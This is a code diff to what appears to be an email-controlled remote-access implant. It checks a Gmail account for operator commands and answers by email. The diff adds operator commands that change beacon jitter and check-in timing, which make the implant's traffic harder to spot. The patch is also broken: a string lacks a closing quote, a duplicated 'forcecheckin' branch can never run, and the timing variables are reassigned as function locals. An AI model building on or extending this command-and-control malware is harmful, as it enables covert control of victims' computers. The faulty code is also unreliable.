@@ -76,7 +76,7 @@ server = "smtp.gmail.com"
 server_port = 587
 AESKey = 'my_AES_key'
 EMAIL_KNOCK_TIMEOUT = 60 #seconds - check for new commands/jobs every EMAIL_KNOCK_TIMEOUT seconds
-JITTER = 50
+JITTER = 100
 TAG = 'RELEASE'
 VERSION = '1.0.0'
 #######################################
@@ -742,6 +742,38 @@ class restart(threading.Thread):
         except Exception as e:
             #if verbose == True: print print_exc()
             pass
+
+class jitter(threading.Thread ):
+
+    def __init__(self, jobid):
+        threading.Thread.__init__(self)
+        self.jobid = jobid
+        self.daemon = True
+        self.start()
+
+    def run(self):
+        try:
+            sendEmail({'cmd': 'jitter', 'res': 'Success'}, jobid=self.jobid)
+            time.sleep(3)
+        except Exception as e:
+            #if verbose == True: print print_exc()
+            pass
+
+class email_check(threading.Thread ):
+
+    def __init__(self, jobid):
+        threading.Thread.__init__(self)
+        self.jobid = jobid
+        self.daemon = True
+        self.start()
+
+    def run(self):
+        try:
+            sendEmail({'cmd': 'email_check, 'res': 'Success'}, jobid=self.jobid)
+            time.sleep(3)
+        except Exception as e:
+            #if verbose == True: print print_exc()
+            pass
         
         
 class logoff(threading.Thread):
@@ -1039,15 +1071,23 @@ def checkJobs():
                     elif cmd == 'forcecheckin':
                         sendEmail("Host checking in as requested", checkin=True)
 
+                    elif cmd == 'forcecheckin':
+                        email_check(jobid)
+                        EMAIL_KNOCK_TIMEOUT = int(arg)
+
+                    elif cmd == 'jitter':
+                        jitter(jobid)
+                        JITTER = int(arg)
+
                     else:
                         raise NotImplementedError
 
             c.logout()
 
-            #multiple by jitter 50% and divide by jitter and use as range
+
             if JITTER != 100:
-                JITTER_HIGH = ((EMAIL_KNOCK_TIMEOUT * JITTER ) /100.0) * 3
-                JITTER_LOW =  (EMAIL_KNOCK_TIMEOUT * JITTER ) /100.0
+                JITTER_HIGH =((EMAIL_KNOCK_TIMEOUT * JITTER) /100.0) * 3
+                JITTER_LOW = (EMAIL_KNOCK_TIMEOUT * JITTER) /100.0
 
                 time.sleep(random.randrange(JITTER_LOW, JITTER_HIGH))
             else:
